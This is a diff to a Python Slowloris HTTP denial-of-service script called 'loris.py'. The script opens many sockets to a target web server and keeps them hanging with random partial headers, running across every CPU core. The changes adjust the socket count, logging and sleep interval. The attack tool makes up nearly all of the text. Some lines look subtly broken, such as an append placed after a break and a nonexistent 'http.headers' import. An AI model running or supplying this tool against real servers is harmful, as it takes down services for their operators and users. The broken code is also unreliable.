@@ -1,22 +1,20 @@
+import argparse
+import logging
+import random
+import socket
+import sys
+import time
 from concurrent.futures.process import ProcessPoolExecutor
-from concurrent.futures.thread import ThreadPoolExecutor
 from multiprocessing import cpu_count
 
 from http import headers
-import argparse
-import logging
-import socket
-import random
-import sys
-import time
-
 
 parser = argparse.ArgumentParser(description="********** Slowloris HTTP DoS Attack by gunes **********",
                                  prog="loris.py",
                                  usage="loris.py [host] [-p PORT] [-s SOCKETS] [-v VERBOSE]")
 parser.add_argument('host', nargs="?", help="host being attacked")
 parser.add_argument('-p', '--port', default=80, help="port number (Web Server [HTTP] port is 80)", type=int)
-parser.add_argument('-s', '--sockets', default=150, help="number of sockets", type=int)
+parser.add_argument('-s', '--sockets', default=50, help="number of sockets", type=int)
 parser.add_argument('-v', '--verbose', dest="verbose", action="store_true", help="Increases logging")
 args = parser.parse_args()
 
@@ -25,16 +23,11 @@ if args.host is None:
 
 if args.verbose:
     logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d.%m.%Y %H:%M:%S", level=logging.DEBUG)
-else:
-    logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%d.%m.%Y %H:%M:%S", level=logging.INFO)
-
 
 sockets = []
 ip = args.host
 port = args.port
 print("\n\nInitializing attack on {}:{}".format(ip, port))
-
-# 160.153.129.19
 
 
 def connect(host_ip):
@@ -62,8 +55,8 @@ def connect(host_ip):
 
 def main():
     socket_count = args.sockets
-    logging.info("Starting an attack to {}:{} with {} sockets.".format(ip, port, socket_count))
-    logging.info("Creating {} sockets...".format(socket_count))
+    print("Starting an attack to {}:{} with {} sockets.".format(ip, port, socket_count))
+    print("Creating {} sockets...".format(socket_count))
 
     for i in range(socket_count):
         try:
@@ -73,21 +66,21 @@ def main():
             break
             sockets.append(s)
 
-    logging.debug("{} sockets are connected to {}.".format(socket_count, ip))
+    print("{} sockets are connected to {}.".format(socket_count, ip))
     while True:
-        logging.info("\nResending the headers for keeping the connection alive...")
+        print("\nResending headers in order to keep the connection alive...")
 
         for s in sockets:
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 2000)).encode("utf-8"))
             except socket.error:
-                logging.info("Socket {} is timed out.".format(s.getsockname()))
+                logging.debug("Socket {} is timed out.".format(s.getsockname()))
                 sockets.remove(s)
 
-        logging.info("Socket count: %s", len(sockets))
+        logging.debug("Socket count: %s", len(sockets))
         dead_sockets = socket_count - len(sockets)
-        logging.debug("{} sockets are timed out...".format(dead_sockets))
-        logging.debug("Recreating {} new sockets...".format(dead_sockets))
+        print("{} sockets are timed out...".format(dead_sockets))
+        print("Recreating {} new sockets...".format(dead_sockets))
 
         for _ in range(dead_sockets):
             try:
@@ -98,11 +91,10 @@ def main():
             except socket.error:
                 break
 
-        logging.debug("Sleeping for 15 seconds in order to keep the connection alive.\n")
-        #time.sleep(15)
+        time.sleep(10)
 
 
 if __name__ == "__main__":
+    # main() is mapped to the cores of the machine
     with ProcessPoolExecutor(max_workers=cpu_count()) as executor:
         out_list = list(executor.map(main()))
-
